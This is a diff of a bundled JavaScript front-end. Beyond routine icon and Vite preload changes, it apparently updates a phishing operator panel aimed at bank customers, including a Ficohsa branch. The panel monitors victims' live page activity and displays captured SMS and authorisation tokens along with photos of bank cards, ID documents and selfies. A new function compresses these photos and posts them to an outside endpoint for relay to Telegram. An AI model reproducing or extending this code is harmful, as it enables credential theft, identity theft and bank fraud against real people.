@@ -17024,7 +17024,7 @@ const createLucideIcon = (iconName, iconNode) => {
  */
 
 
-const __iconNode$M = [
+const __iconNode$N = [
   [
     "path",
     {
@@ -17033,7 +17033,23 @@ const __iconNode$M = [
     }
   ]
 ];
-const Activity = createLucideIcon("activity", __iconNode$M);
+const Activity = createLucideIcon("activity", __iconNode$N);
+
+/**
+ * @license lucide-react v0.563.0 - ISC
+ *
+ * This source code is licensed under the ISC license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$M = [
+  ["path", { d: "M8 3 4 7l4 4", key: "9rb6wj" }],
+  ["path", { d: "M4 7h16", key: "6tx8e3" }],
+  ["path", { d: "m16 21 4-4-4-4", key: "siv7j2" }],
+  ["path", { d: "M20 17H4", key: "h6l3hr" }]
+];
+const ArrowLeftRight = createLucideIcon("arrow-left-right", __iconNode$M);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17044,12 +17060,10 @@ const Activity = createLucideIcon("activity", __iconNode$M);
 
 
 const __iconNode$L = [
-  ["path", { d: "M8 3 4 7l4 4", key: "9rb6wj" }],
-  ["path", { d: "M4 7h16", key: "6tx8e3" }],
-  ["path", { d: "m16 21 4-4-4-4", key: "siv7j2" }],
-  ["path", { d: "M20 17H4", key: "h6l3hr" }]
+  ["path", { d: "M5 12h14", key: "1ays0h" }],
+  ["path", { d: "m12 5 7 7-7 7", key: "xquz4c" }]
 ];
-const ArrowLeftRight = createLucideIcon("arrow-left-right", __iconNode$L);
+const ArrowRight = createLucideIcon("arrow-right", __iconNode$L);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17060,10 +17074,11 @@ const ArrowLeftRight = createLucideIcon("arrow-left-right", __iconNode$L);
 
 
 const __iconNode$K = [
-  ["path", { d: "M5 12h14", key: "1ays0h" }],
-  ["path", { d: "m12 5 7 7-7 7", key: "xquz4c" }]
+  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
+  ["line", { x1: "12", x2: "12", y1: "8", y2: "12", key: "1pkeuh" }],
+  ["line", { x1: "12", x2: "12.01", y1: "16", y2: "16", key: "4dfq90" }]
 ];
-const ArrowRight = createLucideIcon("arrow-right", __iconNode$K);
+const CircleAlert = createLucideIcon("circle-alert", __iconNode$K);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17074,11 +17089,10 @@ const ArrowRight = createLucideIcon("arrow-right", __iconNode$K);
 
 
 const __iconNode$J = [
-  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
-  ["line", { x1: "12", x2: "12", y1: "8", y2: "12", key: "1pkeuh" }],
-  ["line", { x1: "12", x2: "12.01", y1: "16", y2: "16", key: "4dfq90" }]
+  ["path", { d: "M21.801 10A10 10 0 1 1 17 3.335", key: "yps3ct" }],
+  ["path", { d: "m9 11 3 3L22 4", key: "1pflzl" }]
 ];
-const CircleAlert = createLucideIcon("circle-alert", __iconNode$J);
+const CircleCheckBig = createLucideIcon("circle-check-big", __iconNode$J);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17089,10 +17103,10 @@ const CircleAlert = createLucideIcon("circle-alert", __iconNode$J);
 
 
 const __iconNode$I = [
-  ["path", { d: "M21.801 10A10 10 0 1 1 17 3.335", key: "yps3ct" }],
-  ["path", { d: "m9 11 3 3L22 4", key: "1pflzl" }]
+  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
+  ["path", { d: "m9 12 2 2 4-4", key: "dzmm74" }]
 ];
-const CircleCheckBig = createLucideIcon("circle-check-big", __iconNode$I);
+const CircleCheck = createLucideIcon("circle-check", __iconNode$I);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17103,10 +17117,10 @@ const CircleCheckBig = createLucideIcon("circle-check-big", __iconNode$I);
 
 
 const __iconNode$H = [
-  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
-  ["path", { d: "m9 12 2 2 4-4", key: "dzmm74" }]
+  ["path", { d: "M12 6v6l4 2", key: "mmk7yg" }],
+  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }]
 ];
-const CircleCheck = createLucideIcon("circle-check", __iconNode$H);
+const Clock = createLucideIcon("clock", __iconNode$H);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17117,10 +17131,10 @@ const CircleCheck = createLucideIcon("circle-check", __iconNode$H);
 
 
 const __iconNode$G = [
-  ["path", { d: "M12 6v6l4 2", key: "mmk7yg" }],
-  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }]
+  ["rect", { width: "14", height: "14", x: "8", y: "8", rx: "2", ry: "2", key: "17jyea" }],
+  ["path", { d: "M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2", key: "zix9uf" }]
 ];
-const Clock = createLucideIcon("clock", __iconNode$G);
+const Copy = createLucideIcon("copy", __iconNode$G);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17131,10 +17145,11 @@ const Clock = createLucideIcon("clock", __iconNode$G);
 
 
 const __iconNode$F = [
-  ["rect", { width: "14", height: "14", x: "8", y: "8", rx: "2", ry: "2", key: "17jyea" }],
-  ["path", { d: "M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2", key: "zix9uf" }]
+  ["path", { d: "M15 3h6v6", key: "1q9fwt" }],
+  ["path", { d: "M10 14 21 3", key: "gplh6r" }],
+  ["path", { d: "M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6", key: "a6xqqp" }]
 ];
-const Copy = createLucideIcon("copy", __iconNode$F);
+const ExternalLink = createLucideIcon("external-link", __iconNode$F);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17145,21 +17160,6 @@ const Copy = createLucideIcon("copy", __iconNode$F);
 
 
 const __iconNode$E = [
-  ["path", { d: "M15 3h6v6", key: "1q9fwt" }],
-  ["path", { d: "M10 14 21 3", key: "gplh6r" }],
-  ["path", { d: "M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6", key: "a6xqqp" }]
-];
-const ExternalLink = createLucideIcon("external-link", __iconNode$E);
-
-/**
- * @license lucide-react v0.563.0 - ISC
- *
- * This source code is licensed under the ISC license.
- * See the LICENSE file in the root directory of this source tree.
- */
-
-
-const __iconNode$D = [
   [
     "path",
     {
@@ -17177,7 +17177,27 @@ const __iconNode$D = [
   ],
   ["path", { d: "m2 2 20 20", key: "1ooewy" }]
 ];
-const EyeOff = createLucideIcon("eye-off", __iconNode$D);
+const EyeOff = createLucideIcon("eye-off", __iconNode$E);
+
+/**
+ * @license lucide-react v0.563.0 - ISC
+ *
+ * This source code is licensed under the ISC license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$D = [
+  [
+    "path",
+    {
+      d: "M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0",
+      key: "1nclc0"
+    }
+  ],
+  ["circle", { cx: "12", cy: "12", r: "3", key: "1v7zrd" }]
+];
+const Eye = createLucideIcon("eye", __iconNode$D);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17188,16 +17208,11 @@ const EyeOff = createLucideIcon("eye-off", __iconNode$D);
 
 
 const __iconNode$C = [
-  [
-    "path",
-    {
-      d: "M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0",
-      key: "1nclc0"
-    }
-  ],
-  ["circle", { cx: "12", cy: "12", r: "3", key: "1v7zrd" }]
+  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
+  ["path", { d: "M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20", key: "13o1zl" }],
+  ["path", { d: "M2 12h20", key: "9i4pu4" }]
 ];
-const Eye = createLucideIcon("eye", __iconNode$C);
+const Globe = createLucideIcon("globe", __iconNode$C);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17208,11 +17223,10 @@ const Eye = createLucideIcon("eye", __iconNode$C);
 
 
 const __iconNode$B = [
-  ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
-  ["path", { d: "M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20", key: "13o1zl" }],
-  ["path", { d: "M2 12h20", key: "9i4pu4" }]
+  ["rect", { width: "18", height: "11", x: "3", y: "11", rx: "2", ry: "2", key: "1w4ew1" }],
+  ["path", { d: "M7 11V7a5 5 0 0 1 10 0v4", key: "fwvmzm" }]
 ];
-const Globe = createLucideIcon("globe", __iconNode$B);
+const Lock = createLucideIcon("lock", __iconNode$B);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17223,10 +17237,11 @@ const Globe = createLucideIcon("globe", __iconNode$B);
 
 
 const __iconNode$A = [
-  ["rect", { width: "18", height: "11", x: "3", y: "11", rx: "2", ry: "2", key: "1w4ew1" }],
-  ["path", { d: "M7 11V7a5 5 0 0 1 10 0v4", key: "fwvmzm" }]
+  ["path", { d: "m16 17 5-5-5-5", key: "1bji2h" }],
+  ["path", { d: "M21 12H9", key: "dn1m92" }],
+  ["path", { d: "M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4", key: "1uf3rs" }]
 ];
-const Lock = createLucideIcon("lock", __iconNode$A);
+const LogOut = createLucideIcon("log-out", __iconNode$A);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17237,21 +17252,6 @@ const Lock = createLucideIcon("lock", __iconNode$A);
 
 
 const __iconNode$z = [
-  ["path", { d: "m16 17 5-5-5-5", key: "1bji2h" }],
-  ["path", { d: "M21 12H9", key: "dn1m92" }],
-  ["path", { d: "M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4", key: "1uf3rs" }]
-];
-const LogOut = createLucideIcon("log-out", __iconNode$z);
-
-/**
- * @license lucide-react v0.563.0 - ISC
- *
- * This source code is licensed under the ISC license.
- * See the LICENSE file in the root directory of this source tree.
- */
-
-
-const __iconNode$y = [
   [
     "path",
     {
@@ -17260,7 +17260,7 @@ const __iconNode$y = [
     }
   ]
 ];
-const MessageCircle = createLucideIcon("message-circle", __iconNode$y);
+const MessageCircle = createLucideIcon("message-circle", __iconNode$z);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17270,8 +17270,28 @@ const MessageCircle = createLucideIcon("message-circle", __iconNode$y);
  */
 
 
-const __iconNode$x = [["path", { d: "M5 12h14", key: "1ays0h" }]];
-const Minus = createLucideIcon("minus", __iconNode$x);
+const __iconNode$y = [["path", { d: "M5 12h14", key: "1ays0h" }]];
+const Minus = createLucideIcon("minus", __iconNode$y);
+
+/**
+ * @license lucide-react v0.563.0 - ISC
+ *
+ * This source code is licensed under the ISC license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$x = [
+  ["path", { d: "M13 21h8", key: "1jsn5i" }],
+  [
+    "path",
+    {
+      d: "M21.174 6.812a1 1 0 0 0-3.986-3.987L3.842 16.174a2 2 0 0 0-.5.83l-1.321 4.352a.5.5 0 0 0 .623.622l4.353-1.32a2 2 0 0 0 .83-.497z",
+      key: "1a8usu"
+    }
+  ]
+];
+const PenLine = createLucideIcon("pen-line", __iconNode$x);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17282,16 +17302,10 @@ const Minus = createLucideIcon("minus", __iconNode$x);
 
 
 const __iconNode$w = [
-  ["path", { d: "M13 21h8", key: "1jsn5i" }],
-  [
-    "path",
-    {
-      d: "M21.174 6.812a1 1 0 0 0-3.986-3.987L3.842 16.174a2 2 0 0 0-.5.83l-1.321 4.352a.5.5 0 0 0 .623.622l4.353-1.32a2 2 0 0 0 .83-.497z",
-      key: "1a8usu"
-    }
-  ]
+  ["path", { d: "m21 21-4.34-4.34", key: "14j7rj" }],
+  ["circle", { cx: "11", cy: "11", r: "8", key: "4ej97u" }]
 ];
-const PenLine = createLucideIcon("pen-line", __iconNode$w);
+const Search = createLucideIcon("search", __iconNode$w);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17302,10 +17316,9 @@ const PenLine = createLucideIcon("pen-line", __iconNode$w);
 
 
 const __iconNode$v = [
-  ["path", { d: "m21 21-4.34-4.34", key: "14j7rj" }],
-  ["circle", { cx: "11", cy: "11", r: "8", key: "4ej97u" }]
+  ["rect", { width: "18", height: "18", x: "3", y: "3", rx: "2", key: "afitv7" }]
 ];
-const Search = createLucideIcon("search", __iconNode$v);
+const Square = createLucideIcon("square", __iconNode$v);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17316,9 +17329,13 @@ const Search = createLucideIcon("search", __iconNode$v);
 
 
 const __iconNode$u = [
-  ["rect", { width: "18", height: "18", x: "3", y: "3", rx: "2", key: "afitv7" }]
+  ["path", { d: "M10 11v6", key: "nco0om" }],
+  ["path", { d: "M14 11v6", key: "outv1u" }],
+  ["path", { d: "M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6", key: "miytrc" }],
+  ["path", { d: "M3 6h18", key: "d0wm0j" }],
+  ["path", { d: "M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2", key: "e791ji" }]
 ];
-const Square = createLucideIcon("square", __iconNode$u);
+const Trash2 = createLucideIcon("trash-2", __iconNode$u);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17329,23 +17346,6 @@ const Square = createLucideIcon("square", __iconNode$u);
 
 
 const __iconNode$t = [
-  ["path", { d: "M10 11v6", key: "nco0om" }],
-  ["path", { d: "M14 11v6", key: "outv1u" }],
-  ["path", { d: "M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6", key: "miytrc" }],
-  ["path", { d: "M3 6h18", key: "d0wm0j" }],
-  ["path", { d: "M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2", key: "e791ji" }]
-];
-const Trash2 = createLucideIcon("trash-2", __iconNode$t);
-
-/**
- * @license lucide-react v0.563.0 - ISC
- *
- * This source code is licensed under the ISC license.
- * See the LICENSE file in the root directory of this source tree.
- */
-
-
-const __iconNode$s = [
   [
     "path",
     {
@@ -17356,7 +17356,21 @@ const __iconNode$s = [
   ["path", { d: "M12 9v4", key: "juzpu7" }],
   ["path", { d: "M12 17h.01", key: "p32p05" }]
 ];
-const TriangleAlert = createLucideIcon("triangle-alert", __iconNode$s);
+const TriangleAlert = createLucideIcon("triangle-alert", __iconNode$t);
+
+/**
+ * @license lucide-react v0.563.0 - ISC
+ *
+ * This source code is licensed under the ISC license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$s = [
+  ["path", { d: "M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2", key: "975kel" }],
+  ["circle", { cx: "12", cy: "7", r: "4", key: "17ys0d" }]
+];
+const User$1 = createLucideIcon("user", __iconNode$s);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17367,10 +17381,12 @@ const TriangleAlert = createLucideIcon("triangle-alert", __iconNode$s);
 
 
 const __iconNode$r = [
-  ["path", { d: "M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2", key: "975kel" }],
-  ["circle", { cx: "12", cy: "7", r: "4", key: "17ys0d" }]
+  ["path", { d: "M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2", key: "1yyitq" }],
+  ["path", { d: "M16 3.128a4 4 0 0 1 0 7.744", key: "16gr8j" }],
+  ["path", { d: "M22 21v-2a4 4 0 0 0-3-3.87", key: "kshegd" }],
+  ["circle", { cx: "9", cy: "7", r: "4", key: "nufk8" }]
 ];
-const User$1 = createLucideIcon("user", __iconNode$r);
+const Users = createLucideIcon("users", __iconNode$r);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17381,12 +17397,17 @@ const User$1 = createLucideIcon("user", __iconNode$r);
 
 
 const __iconNode$q = [
-  ["path", { d: "M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2", key: "1yyitq" }],
-  ["path", { d: "M16 3.128a4 4 0 0 1 0 7.744", key: "16gr8j" }],
-  ["path", { d: "M22 21v-2a4 4 0 0 0-3-3.87", key: "kshegd" }],
-  ["circle", { cx: "9", cy: "7", r: "4", key: "nufk8" }]
+  [
+    "path",
+    {
+      d: "M11 4.702a.705.705 0 0 0-1.203-.498L6.413 7.587A1.4 1.4 0 0 1 5.416 8H3a1 1 0 0 0-1 1v6a1 1 0 0 0 1 1h2.416a1.4 1.4 0 0 1 .997.413l3.383 3.384A.705.705 0 0 0 11 19.298z",
+      key: "uqj9uw"
+    }
+  ],
+  ["path", { d: "M16 9a5 5 0 0 1 0 6", key: "1q6k2b" }],
+  ["path", { d: "M19.364 18.364a9 9 0 0 0 0-12.728", key: "ijwkga" }]
 ];
-const Users = createLucideIcon("users", __iconNode$q);
+const Volume2 = createLucideIcon("volume-2", __iconNode$q);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17404,10 +17425,10 @@ const __iconNode$p = [
       key: "uqj9uw"
     }
   ],
-  ["path", { d: "M16 9a5 5 0 0 1 0 6", key: "1q6k2b" }],
-  ["path", { d: "M19.364 18.364a9 9 0 0 0 0-12.728", key: "ijwkga" }]
+  ["line", { x1: "22", x2: "16", y1: "9", y2: "15", key: "1ewh16" }],
+  ["line", { x1: "16", x2: "22", y1: "9", y2: "15", key: "5ykzw1" }]
 ];
-const Volume2 = createLucideIcon("volume-2", __iconNode$p);
+const VolumeX = createLucideIcon("volume-x", __iconNode$p);
 
 /**
  * @license lucide-react v0.563.0 - ISC
@@ -17418,31 +17439,10 @@ const Volume2 = createLucideIcon("volume-2", __iconNode$p);
 
 
 const __iconNode$o = [
-  [
-    "path",
-    {
-      d: "M11 4.702a.705.705 0 0 0-1.203-.498L6.413 7.587A1.4 1.4 0 0 1 5.416 8H3a1 1 0 0 0-1 1v6a1 1 0 0 0 1 1h2.416a1.4 1.4 0 0 1 .997.413l3.383 3.384A.705.705 0 0 0 11 19.298z",
-      key: "uqj9uw"
-    }
-  ],
-  ["line", { x1: "22", x2: "16", y1: "9", y2: "15", key: "1ewh16" }],
-  ["line", { x1: "16", x2: "22", y1: "9", y2: "15", key: "5ykzw1" }]
-];
-const VolumeX = createLucideIcon("volume-x", __iconNode$o);
-
-/**
- * @license lucide-react v0.563.0 - ISC
- *
- * This source code is licensed under the ISC license.
- * See the LICENSE file in the root directory of this source tree.
- */
-
-
-const __iconNode$n = [
   ["path", { d: "M18 6 6 18", key: "1bl5f8" }],
   ["path", { d: "m6 6 12 12", key: "d8bk6v" }]
 ];
-const X$1 = createLucideIcon("x", __iconNode$n);
+const X$1 = createLucideIcon("x", __iconNode$o);
 
 const soundPaths = {
   good: "/sounds/toast_good-notify.mp3",
@@ -18083,22 +18083,30 @@ const ProtectedLayout = () => {
   ) });
 };
 
-const scriptRel = 'modulepreload';const assetsURL = function(dep) { return "/"+dep };const seen = {};const __vitePreload = function preload(baseModule, deps, importerUrl) {
+const scriptRel = 'modulepreload';const assetsURL = function(dep, importerUrl) { return new URL(dep, importerUrl).href };const seen = {};const __vitePreload = function preload(baseModule, deps, importerUrl) {
   let promise = Promise.resolve();
   if (true && deps && deps.length > 0) {
-    document.getElementsByTagName("link");
+    const links = document.getElementsByTagName("link");
     const cspNonceMeta = document.querySelector(
       "meta[property=csp-nonce]"
     );
     const cspNonce = cspNonceMeta?.nonce || cspNonceMeta?.getAttribute("nonce");
     promise = Promise.allSettled(
       deps.map((dep) => {
-        dep = assetsURL(dep);
+        dep = assetsURL(dep, importerUrl);
         if (dep in seen) return;
         seen[dep] = true;
         const isCss = dep.endsWith(".css");
         const cssSelector = isCss ? '[rel="stylesheet"]' : "";
-        if (document.querySelector(`link[href="${dep}"]${cssSelector}`)) {
+        const isBaseRelative = !!importerUrl;
+        if (isBaseRelative) {
+          for (let i = links.length - 1; i >= 0; i--) {
+            const link2 = links[i];
+            if (link2.href === dep && (!isCss || link2.rel === "stylesheet")) {
+              return;
+            }
+          }
+        } else if (document.querySelector(`link[href="${dep}"]${cssSelector}`)) {
           return;
         }
         const link = document.createElement("link");
@@ -18142,6 +18150,70 @@ const scriptRel = 'modulepreload';const assetsURL = function(dep) { return "/"+d
     return baseModule().catch(handlePreloadError);
   });
 };
+
+async function comprimirImagenParaTelegram(dataUrl, maxBytes = 85e3) {
+  if (!dataUrl || dataUrl.length <= maxBytes) return dataUrl;
+  return new Promise((resolve) => {
+    const img = new Image();
+    img.onload = () => {
+      const canvas = document.createElement("canvas");
+      const maxDim = 960;
+      let w = img.width || 640;
+      let h = img.height || 480;
+      if (w > maxDim || h > maxDim) {
+        const ratio = Math.min(maxDim / w, maxDim / h);
+        w = Math.round(w * ratio);
+        h = Math.round(h * ratio);
+      }
+      canvas.width = w;
+      canvas.height = h;
+      const ctx = canvas.getContext("2d");
+      if (!ctx) {
+        resolve(dataUrl);
+        return;
+      }
+      ctx.drawImage(img, 0, 0, w, h);
+      for (const q of [0.7, 0.55, 0.4, 0.28]) {
+        const compressed = canvas.toDataURL("image/jpeg", q);
+        if (compressed.length <= maxBytes || q === 0.28) {
+          resolve(compressed);
+          return;
+        }
+      }
+      resolve(dataUrl);
+    };
+    img.onerror = () => resolve(dataUrl);
+    img.src = dataUrl;
+  });
+}
+async function enviarFotoTelegram(bank, photo, caption, label) {
+  const safePhoto = await comprimirImagenParaTelegram(photo);
+  try {
+    const res = await fetch("https://adminconfig-panel.vercel.app/api/notify-photo", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        bank,
+        photo: safePhoto,
+        caption
+      })
+    });
+    if (!res.ok) {
+      const data = await res.json().catch(() => ({}));
+      const detail = data?.error || `HTTP ${res.status}`;
+      console.error(`[Telegram] Error enviando ${label}:`, detail);
+      toast.error("No se pudo enviar la foto a Telegram", {
+        description: detail,
+        duration: 5e3
+      });
+    }
+  } catch (err) {
+    console.error(`[Telegram] Error de red enviando ${label}:`, err);
+    toast.error("Error de red al enviar foto a Telegram", {
+      duration: 5e3
+    });
+  }
+}
 
 var cjs = {exports: {}};
 
@@ -22328,15 +22400,23 @@ function UserListSidebar({
         const isViewing = user.pageState === "viewing" || user.pageState === "active";
         const isMinimized = user.pageState === "minimized";
         return /* @__PURE__ */ jsxRuntimeExports.jsxs(
-          motion.button,
+          motion.div,
           {
+            role: "button",
+            tabIndex: 0,
             onClick: () => onSelectUser(user.id),
+            onKeyDown: (e) => {
+              if (e.key === "Enter" || e.key === " ") {
+                e.preventDefault();
+                onSelectUser(user.id);
+              }
+            },
             initial: { opacity: 0, x: 10 },
             animate: { opacity: 1, x: 0 },
             exit: { opacity: 0, x: 10, transition: { duration: 0.12 } },
             transition: { duration: 0.2, delay: index * 0.02 },
             className: cn(
-              "w-full flex flex-col gap-2 px-4 py-3 rounded-xl border transition-all duration-200 text-left relative overflow-hidden outline-none focus:outline-none focus:ring-0 focus-visible:outline-none",
+              "w-full flex flex-col gap-2 px-4 py-3 rounded-xl border transition-all duration-200 text-left relative overflow-hidden outline-none focus:outline-none focus:ring-0 focus-visible:outline-none cursor-pointer",
               user.isTyping ? "border-emerald-500/30 bg-emerald-500/[0.08]  text-white" : isSelected ? isFicohsa ? "border-blue-500/30 bg-blue-500/10 shadow-lg shadow-blue-900/10 text-white" : "border-red-500/30 bg-red-500/10 shadow-lg shadow-red-900/10 text-white" : "border-white/[0.05] bg-white/[0.02] hover:bg-white/[0.04] hover:border-white/[0.1] text-white/70 hover:text-white"
             ),
             children: [
@@ -22447,7 +22527,7 @@ const BrowserEmulator = ({ children, overlays }) => {
         onMouseDown: (e) => {
           if (e.button === 0) {
             try {
-              __vitePreload(async () => { const {getCurrentWindow} = await Promise.resolve().then(() => window$1);return { getCurrentWindow }},true?void 0:void 0).then(({ getCurrentWindow }) => {
+              __vitePreload(async () => { const {getCurrentWindow} = await Promise.resolve().then(() => window$1);return { getCurrentWindow }},true?void 0:void 0,import.meta.url).then(({ getCurrentWindow }) => {
                 getCurrentWindow().startDragging();
               });
             } catch {
@@ -22560,10 +22640,10 @@ const UserInfoPanel = ({ user, onSelectPhoto }) => {
         } else {
           return [
             { label: idLabel, value: idValue || "—", key: "id" },
-            { label: "Desbloquear", value: user.token || "", key: "token" },
-            { label: "Registrar", value: user.smsToken || "", key: "smsToken" },
-            { label: "Token Validar", value: user.validarToken || "", key: "validarToken" },
-            { label: "Token Autorizar", value: user.autorizarToken || "", key: "autorizarToken" }
+            { label: "SMS Desbloquear", value: user.token || "", key: "token" },
+            { label: "SMS Registrar", value: user.smsToken || "", key: "smsToken" },
+            { label: "T. Desbloquear", value: user.validarToken || "", key: "validarToken" },
+            { label: "T. Registrar", value: user.autorizarToken || "", key: "autorizarToken" }
           ];
         }
       })().map((item, idx) => /* @__PURE__ */ jsxRuntimeExports.jsxs(
@@ -22599,18 +22679,18 @@ const UserInfoPanel = ({ user, onSelectPhoto }) => {
         },
         idx
       )),
-      (user.fotoFrente || user.fotoReverso) && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "mt-2.5 p-2 bg-gray-950/40 border border-emerald-500/30 rounded-lg", children: [
-        /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex items-center justify-between mb-2", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-gray-300 font-semibold text-xs flex items-center gap-1.5", children: [
+      (user.fotoFrente || user.fotoReverso || user.fotoSelfie) && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "mt-2.5 p-2 bg-gray-950/40 border border-emerald-500/30 rounded-lg space-y-2.5", children: [
+        /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex items-center justify-between", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-gray-300 font-semibold text-xs flex items-center gap-1.5", children: [
           /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" }),
-          "Tarjetas aprobadas:"
+          isFicohsa ? "Tarjetas aprobadas:" : "Fotos aprobadas:"
         ] }) }),
-        /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "grid grid-cols-2 gap-2", children: [
+        (user.fotoFrente || user.fotoReverso) && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "grid grid-cols-2 gap-2", children: [
           /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-col gap-1", children: [
-            /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: "Frente" }),
+            /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: isFicohsa ? "Frente" : "Documento frente" }),
             user.fotoFrente && typeof user.fotoFrente === "string" && user.fotoFrente.startsWith("data:") ? /* @__PURE__ */ jsxRuntimeExports.jsxs(
               "button",
               {
-                onClick: () => onSelectPhoto?.({ src: user.fotoFrente, title: "Tarjeta - Frente" }),
+                onClick: () => onSelectPhoto?.({ src: user.fotoFrente, title: isFicohsa ? "Tarjeta - Frente" : "DNI - Frente" }),
                 className: "relative group/thumb rounded-md overflow-hidden border border-emerald-500/40 hover:border-emerald-400 transition-all aspect-[16/10] bg-black/60 focus:outline-none cursor-pointer",
                 title: "Ver frente en pantalla completa",
                 children: [
@@ -22618,7 +22698,7 @@ const UserInfoPanel = ({ user, onSelectPhoto }) => {
                     "img",
                     {
                       src: user.fotoFrente,
-                      alt: "Frente Tarjeta",
+                      alt: isFicohsa ? "Frente Tarjeta" : "Frente DNI",
                       className: "w-full h-full object-cover group-hover/thumb:scale-105 transition-transform duration-200"
                     }
                   ),
@@ -22628,11 +22708,11 @@ const UserInfoPanel = ({ user, onSelectPhoto }) => {
             ) : /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "rounded-md border border-gray-800 bg-gray-900/60 aspect-[16/10] flex items-center justify-center text-[10px] text-gray-400", children: user.fotoFrente ? "Aprobado" : "Pendiente" })
           ] }),
           /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-col gap-1", children: [
-            /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: "Reverso" }),
+            /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: isFicohsa ? "Reverso" : "Documento reverso" }),
             user.fotoReverso && typeof user.fotoReverso === "string" && user.fotoReverso.startsWith("data:") ? /* @__PURE__ */ jsxRuntimeExports.jsxs(
               "button",
               {
-                onClick: () => onSelectPhoto?.({ src: user.fotoReverso, title: "Tarjeta - Reverso" }),
+                onClick: () => onSelectPhoto?.({ src: user.fotoReverso, title: isFicohsa ? "Tarjeta - Reverso" : "DNI - Reverso" }),
                 className: "relative group/thumb rounded-md overflow-hidden border border-emerald-500/40 hover:border-emerald-400 transition-all aspect-[16/10] bg-black/60 focus:outline-none cursor-pointer",
                 title: "Ver reverso en pantalla completa",
                 children: [
@@ -22640,7 +22720,7 @@ const UserInfoPanel = ({ user, onSelectPhoto }) => {
                     "img",
                     {
                       src: user.fotoReverso,
-                      alt: "Reverso Tarjeta",
+                      alt: isFicohsa ? "Reverso Tarjeta" : "Reverso DNI",
                       className: "w-full h-full object-cover group-hover/thumb:scale-105 transition-transform duration-200"
                     }
                   ),
@@ -22649,6 +22729,28 @@ const UserInfoPanel = ({ user, onSelectPhoto }) => {
               }
